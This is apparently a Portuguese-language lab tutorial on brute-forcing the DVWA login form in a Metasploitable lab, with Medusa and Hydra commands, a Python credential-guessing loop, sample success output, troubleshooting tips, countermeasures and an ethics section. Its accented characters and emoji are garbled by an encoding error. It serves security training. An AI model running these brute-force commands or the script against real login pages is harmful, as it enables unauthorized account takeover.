# üåê Etapa 3.2: Ataque a Formul√°rios Web - DVWA

## üìã Objetivo

Esta etapa demonstra como realizar ataques de for√ßa bruta contra formul√°rios de login em aplica√ß√µes web, utilizando o DVWA (Damn Vulnerable Web Application) como alvo e analisando as requisi√ß√µes HTTP para construir ataques automatizados.

---

## üéØ Pr√©-requisitos

### ‚úÖ Verifica√ß√µes Necess√°rias

- [ ] Metasploitable com DVWA acess√≠vel
- [ ] Conectividade confirmada com a m√°quina alvo
- [ ] Navegador web dispon√≠vel no Kali Linux
- [ ] Ferramentas de desenvolvedor habilitadas

### üîç Verifica√ß√£o de Acesso ao DVWA

```bash
# Teste de conectividade HTTP
curl -I http://192.168.56.101/dvwa/

# Resultado esperado: HTTP 200 OK
```

---

## üîç Passo 1: An√°lise do Formul√°rio de Login

### üåê Acesso √† Aplica√ß√£o

```bash
# URL de acesso
http://192.168.56.101/dvwa/login.php
```

### üéØ O que √© o DVWA?

- **DVWA** (Damn Vulnerable Web Application): Aplica√ß√£o web intencionalmente vulner√°vel
- **Prop√≥sito educacional**: Ensinar seguran√ßa web atrav√©s de vulnerabilidades pr√°ticas
- **M√∫ltiplos n√≠veis**: Low, Medium, High, Impossible
- **Diversos ataques**: SQL Injection, XSS, CSRF, Brute Force, etc.

### üõ†Ô∏è Inspe√ß√£o T√©cnica do Formul√°rio

#### 1. Abertura das Ferramentas de Desenvolvimento

```bash
# No navegador (Firefox/Chromium no Kali)
Tecla: F12
Ou: Bot√£o direito > Inspecionar elemento
```

#### 2. Monitoramento de Requisi√ß√µes de Rede

```bash
# Aba Network/Rede nas Developer Tools
1. Abrir aba "Network"
2. Limpar requisi√ß√µes anteriores (bot√£o üóëÔ∏è)
3. Manter aba aberta durante o teste
```

#### 3. Teste de Login Falso

```bash
# Credenciais de teste (inv√°lidas)
Usu√°rio: test123
Senha: fake456
Login: Login
```

### üìä An√°lise da Requisi√ß√£o HTTP

#### Dados Capturados

| Campo            | Valor                               | Descri√ß√£o               |
| ---------------- | ----------------------------------- | ----------------------- |
| **M√©todo**       | POST                                | Tipo de requisi√ß√£o HTTP |
| **URL**          | `/dvwa/login.php`                   | Endpoint do formul√°rio  |
| **Content-Type** | `application/x-www-form-urlencoded` | Formato dos dados       |

#### Par√¢metros do Formul√°rio

```http
POST /dvwa/login.php HTTP/1.1
Host: 192.168.56.101
Content-Type: application/x-www-form-urlencoded

username=test123&password=fake456&Login=Login
```

#### Resposta de Falha

```html
<!-- Mensagem de erro identificada -->
<div class="message">Login failed</div>
```

### üîç Estrutura da Requisi√ß√£o Analisada

```bash
# Elementos identificados para automa√ß√£o
URL Alvo: http://192.168.56.101/dvwa/login.php
M√©todo: POST
Par√¢metros:
  - username: [valor do usu√°rio]
  - password: [valor da senha]
  - Login: "Login" (bot√£o submit)
Indicador de Falha: "Login failed"
```

---

## üìù Passo 2: Prepara√ß√£o das Wordlists

### üë• Cria√ß√£o da Lista de Usu√°rios

```bash
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
```

#### üîç An√°lise Estrat√©gica dos Usu√°rios

| Usu√°rio      | Categoria       | Probabilidade | Justificativa                 |
| ------------ | --------------- | ------------- | ----------------------------- |
| **user**     | Gen√©rico        | Alta          | Nome comum em sistemas        |
| **msfadmin** | Target-specific | Muito Alta    | Usu√°rio padr√£o Metasploitable |
| **admin**    | Administrativo  | Alta          | Conta administrativa padr√£o   |
| **root**     | Sistema         | M√©dia         | Superusu√°rio Unix/Linux       |

### üîê Cria√ß√£o da Lista de Senhas

```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

#### üîç An√°lise Estrat√©gica das Senhas

| Senha        | Categoria       | Rank Global | Justificativa                 |
| ------------ | --------------- | ----------- | ----------------------------- |
| **123456**   | Sequencial      | #1          | Senha mais usada mundialmente |
| **password** | Gen√©rica        | #2          | Segunda mais comum            |
| **qwerty**   | Teclado         | #7          | Padr√£o de teclado             |
| **msfadmin** | Target-specific | N/A         | Senha padr√£o do alvo          |

### üìä Estat√≠sticas de Efetividade

- **Combina√ß√£o total**: 4 usu√°rios √ó 4 senhas = 16 tentativas
- **Tempo estimado**: 1-3 minutos (dependendo da configura√ß√£o)

---

## ‚öîÔ∏è Passo 3: Execu√ß√£o do Ataque Automatizado

### üõ†Ô∏è Comando Medusa para HTTP Forms

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m FAIL:'Login failed' \
  -t 6
```

### üîß An√°lise Detalhada dos Par√¢metros

#### Par√¢metros B√°sicos

| Par√¢metro | Valor          | Descri√ß√£o           |
| --------- | -------------- | ------------------- |
| **-h**    | 192.168.56.101 | Host/IP alvo        |
| **-U**    | users.txt      | Arquivo de usu√°rios |
| **-P**    | pass.txt       | Arquivo de senhas   |
| **-M**    | http           | M√≥dulo HTTP         |
| **-t**    | 6              | Threads simult√¢neas |

#### Par√¢metros Espec√≠ficos HTTP (-m)

| Par√¢metro | Valor                                         | Explica√ß√£o                       |
| --------- | --------------------------------------------- | -------------------------------- |
| **PAGE**  | '/dvwa/login.php'                             | P√°gina de destino da requisi√ß√£o  |
| **FORM**  | 'username=^USER^&password=^PASS^&Login=Login' | Estrutura do formul√°rio          |
| **FAIL**  | 'Login failed'                                | String que indica falha de login |

### üéØ Vari√°veis Din√¢micas

- **^USER^**: Substitu√≠do pelos valores de users.txt
- **^PASS^**: Substitu√≠do pelos valores de pass.txt

### ‚ö° Como Funciona o Ataque

```mermaid
graph TD
    A[Medusa inicia] --> B[Carrega users.txt]
    B --> C[Carrega pass.txt]
    C --> D[Inicia 6 threads HTTP]
    D --> E[Constr√≥i requisi√ß√£o POST]
    E --> F[Envia para /dvwa/login.php]
    F --> G{Resposta cont√©m 'Login failed'?}
    G -->|Sim| H[Pr√≥xima combina√ß√£o]
    G -->|N√£o| I[üéâ CREDENCIAL V√ÅLIDA!]
    H --> E
    I --> J[Para o ataque]
```

---

## üèÜ Passo 4: Interpreta√ß√£o dos Resultados

### ‚úÖ Cen√°rio de Sucesso

```bash
ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: password [SUCCESS]
```

### üìä Informa√ß√µes da Credencial V√°lida

| Campo          | Valor        | Observa√ß√£o           |
| -------------- | ------------ | -------------------- |
| **Usu√°rio**    | admin        | Conta administrativa |
| **Senha**      | password     | Senha fraca padr√£o   |
| **Tempo**      | ~30 segundos | Tempo at√© descoberta |
| **Tentativas** | ~8/16        | Posi√ß√£o na lista     |

### ‚ùå Cen√°rios de Falha

```bash
# Nenhuma credencial encontrada
ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1) User: root Password: msfadmin [FAILED]

# Problemas de conectividade
ERROR: connect (Connection refused)

# Aplica√ß√£o indispon√≠vel
ERROR: HTTP/1.1 404 Not Found
```

---

## üß™ Passo 5: Valida√ß√£o Manual do Acesso

### üåê Teste de Login Manual

```bash
# Acesso via navegador
URL: http://192.168.56.101/dvwa/login.php
Usu√°rio: [credencial descoberta]
Senha: [senha descoberta]
```

### ‚úÖ Confirma√ß√£o de Acesso Bem-sucedido

```bash
# Indicadores de sucesso
1. Redirecionamento para dashboard
2. Aus√™ncia da mensagem "Login failed"
3. Interface administrativa vis√≠vel
4. Menu de vulnerabilidades dispon√≠vel
```

### üìã Exemplo de Sess√£o V√°lida

```http
# Requisi√ß√£o de login bem-sucedida
POST /dvwa/login.php HTTP/1.1
Host: 192.168.56.101
Content-Type: application/x-www-form-urlencoded

username=admin&password=password&Login=Login

# Resposta (redirecionamento)
HTTP/1.1 302 Found
Location: /dvwa/index.php
Set-Cookie: PHPSESSID=abc123; path=/
```

---

## üõ°Ô∏è Contramedidas e Defesas

### üîí Medidas de Seguran√ßa Preventivas

#### 1. Autentica√ß√£o Multifator (MFA)

```bash
# Implementa√ß√µes recomendadas
- Google Authenticator (TOTP)
- SMS de verifica√ß√£o
- Tokens de hardware (YubiKey)
- Biometria
```

#### 2. Prote√ß√£o CSRF

```php
// Exemplo de token CSRF
<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
```

#### 3. Rate Limiting e Throttling

```bash
# Configura√ß√µes recomendadas
- 3 tentativas por IP por minuto
- Bloqueio progressivo (1min, 5min, 15min)
- Whitelist de IPs administrativos
- Monitoramento de padr√µes an√¥malos
```

#### 4. CAPTCHA

```html
<!-- Google reCAPTCHA v3 -->
<div class="g-recaptcha" data-sitekey="your-site-key"></div>
```

### üö® Monitoramento e Detec√ß√£o

#### Logs de Seguran√ßa

```bash
# Eventos a monitorar
- M√∫ltiplas tentativas de login
- Logins de IPs desconhecidos
- Padr√µes de requisi√ß√µes automatizadas
- User-Agents suspeitos
```

#### Alertas Automatizados

```bash
# Configura√ß√µes SIEM
- > 5 falhas de login/min por IP
- > 50 falhas de login/hora global
- Tentativas fora do hor√°rio comercial
- Geolocaliza√ß√£o an√¥mala
```

### üìä Implementa√ß√£o de Contramedidas

| Medida            | Efic√°cia   | Complexidade | Custo    |
| ----------------- | ---------- | ------------ | -------- |
| **Senha forte**   | Alta       | Baixa        | Gratuito |
| **Rate limiting** | Alta       | M√©dia        | Baixo    |
| **MFA**           | Muito Alta | M√©dia        | M√©dio    |
| **CAPTCHA**       | M√©dia      | Baixa        | Gratuito |
| **WAF**           | Alta       | Alta         | Alto     |

---

## üîç T√©cnicas Avan√ßadas de Ataque

### üõ†Ô∏è Ferramentas Alternativas

#### Hydra (Alternativa Popular)

```bash
hydra -L users.txt -P pass.txt 192.168.56.101 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

#### Burp Suite (Profissional)

```bash
# Configura√ß√£o do Burp Intruder
1. Interceptar requisi√ß√£o de login
2. Enviar para Intruder
3. Configurar posi√ß√µes de payload
4. Carregar wordlists
5. Executar ataque
```

#### Custom Python Script

```python
import requests
import itertools

users = ['admin', 'user', 'msfadmin', 'root']
passwords = ['password', '123456', 'qwerty', 'msfadmin']

for user, pwd in itertools.product(users, passwords):
    data = {'username': user, 'password': pwd, 'Login': 'Login'}
    r = requests.post('http://192.168.56.101/dvwa/login.php', data=data)
    if 'Login failed' not in r.text:
        print(f"[SUCCESS] {user}:{pwd}")
        break
```

### ‚ö° Otimiza√ß√µes de Performance

```bash
# Medusa com configura√ß√µes otimizadas
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m FAIL:'Login failed' \
  -t 10 \        # Mais threads
  -T 3 \         # Timeout menor
  -v 4           # Verbose para debugging
```

---

## üìö An√°lise de Vulnerabilidades Web

### üéØ Classifica√ß√£o OWASP

- **A07:2021 - Identification and Authentication Failures**
- Falha na implementa√ß√£o de controles de autentica√ß√£o
- Permite ataques de for√ßa bruta automatizados
- Aus√™ncia de prote√ß√µes adequadas

### üîç Vetores de Ataque Relacionados

1. **Credential Stuffing**: Uso de credenciais vazadas
2. **Password Spraying**: Senhas comuns contra muitos usu√°rios
3. **Dictionary Attacks**: Wordlists espec√≠ficas
4. **Hybrid Attacks**: Combina√ß√£o de t√©cnicas

### üìä Impacto do Neg√≥cio

| Aspecto               | Impacto | Descri√ß√£o                          |
| --------------------- | ------- | ---------------------------------- |
| **Confidencialidade** | Alto    | Acesso n√£o autorizado a dados      |
| **Integridade**       | M√©dio   | Poss√≠vel altera√ß√£o de dados        |
| **Disponibilidade**   | Baixo   | Sistema pode permanecer dispon√≠vel |
| **Reputa√ß√£o**         | Alto    | Danos √† imagem da organiza√ß√£o      |

---

## ‚ö†Ô∏è Considera√ß√µes √âticas e Legais

### üö® **AVISO CR√çTICO**

> Este ataque deve ser realizado **APENAS** em:
>
> - Ambientes de laborat√≥rio controlados
> - Sistemas pr√≥prios ou com autoriza√ß√£o expl√≠cita
> - Programas de bug bounty autorizados
> - Testes de penetra√ß√£o contratados

### üìã Checklist Legal

- [ ] Autoriza√ß√£o por escrito obtida
- [ ] Escopo bem definido e limitado
- [ ] Ambiente isolado da produ√ß√£o
- [ ] Documenta√ß√£o completa dos testes
- [ ] Plano de remedia√ß√£o preparado

### ‚úÖ Boas Pr√°ticas √âticas

- **Divulga√ß√£o respons√°vel** de vulnerabilidades
- **N√£o causar danos** aos sistemas testados
- **Respeitar limites** de tempo e escopo
- **Proteger informa√ß√µes** descobertas

---

## üìö Pr√≥ximos Passos

### üéØ Com Acesso Obtido ao DVWA

1. **Explorar outras vulnerabilidades**:

   - SQL Injection
   - Cross-Site Scripting (XSS)
   - Cross-Site Request Forgery (CSRF)
   - File Upload vulnerabilities

2. **Escalar privil√©gios**:

   - Buscar vulnerabilidades de sistema
   - Explorar configura√ß√µes inadequadas
   - Tentar acesso ao sistema operacional

3. **Documentar descobertas**:
   - Catalogar todas as vulnerabilidades
   - Criar relat√≥rio de penetration testing
   - Sugerir corre√ß√µes e melhorias

### üîÑ Se o Ataque Falhar

1. **Wordlists mais extensas**:

   - /usr/share/wordlists/rockyou.txt
   - SecLists password lists
   - Custom wordlists baseadas no alvo

2. **Outras t√©cnicas**:
   - An√°lise de c√≥digo-fonte
   - Social engineering
   - Explora√ß√£o de outras aplica√ß√µes

---

## üìä M√©tricas e Resultados

### ‚è±Ô∏è Performance Esperada

| Cen√°rio              | Tempo      | Tentativas | Taxa Sucesso |
| -------------------- | ---------- | ---------- | ------------ |
| **Wordlist pequena** | 1-3 min    | 16         | 90%          |
| **Wordlist m√©dia**   | 5-15 min   | 100        | 70%          |
| **Wordlist grande**  | 30-120 min | 1000+      | 40%          |

### üìà Fatores de Sucesso

- **Qualidade das wordlists**: 40%
- **Configura√ß√£o de seguran√ßa do alvo**: 35%
- **Timing e threads**: 15%
- **Precis√£o dos par√¢metros**: 10%

---

## üîß Troubleshooting

### ‚ùå Problemas Comuns

#### 1. Erro de Conex√£o

```bash
# Problema: ERROR: connect (Connection refused)
# Solu√ß√£o:
curl -I http://192.168.56.101/dvwa/
ping -c 3 192.168.56.101
```

#### 2. Par√¢metros Incorretos

```bash
# Problema: Todas as tentativas falham
# Solu√ß√£o: Verificar estrutura do formul√°rio
curl -X POST http://192.168.56.101/dvwa/login.php \
  -d "username=test&password=test&Login=Login" -v
```

#### 3. Rate Limiting

```bash
# Problema: Conex√µes muito lentas/timeout
# Solu√ß√£o: Reduzir threads e adicionar delay
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m FAIL:'Login failed' \
  -t 2 -T 10  # 2 threads, timeout 10s
```

---

## üèÅ Conclus√£o

Esta etapa demonstrou com sucesso:

- ‚úÖ **An√°lise t√©cnica** de formul√°rios web
- ‚úÖ **Automa√ß√£o de ataques** de for√ßa bruta HTTP
- ‚úÖ **Uso profissional** da ferramenta Medusa
- ‚úÖ **Interpreta√ß√£o de resultados** de pentesting
- ‚úÖ **Implementa√ß√£o de contramedidas** defensivas
- ‚úÖ **Considera√ß√µes √©ticas** em testes de seguran√ßa

### üéì Compet√™ncias Desenvolvidas

- An√°lise de aplica√ß√µes web
- Uso de ferramentas de desenvolvedor
- Automa√ß√£o de ataques HTTP
- Interpreta√ß√£o de logs de seguran√ßa
- Desenvolvimento de estrat√©gias defensivas

